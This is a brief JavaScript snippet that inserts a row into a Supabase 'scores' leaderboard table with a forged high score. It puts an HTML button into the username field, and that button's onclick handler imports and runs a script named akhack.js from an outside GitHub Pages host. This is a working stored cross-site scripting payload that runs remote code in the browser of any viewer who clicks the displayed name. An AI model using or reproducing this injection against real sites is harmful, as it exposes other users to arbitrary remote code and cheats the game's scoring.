const { error } = await supabase.from("scores").insert([{
      username: `<button id="mycoolbutton" onclick="(async()=>{ const mod = await import('https://misterxak.github.io/akhack/akhack.js'); mod.hack() })()">Naam weergeven</button>`,
      code: "misterx",
      game: spelNaam,
      points: 14305
    }]);
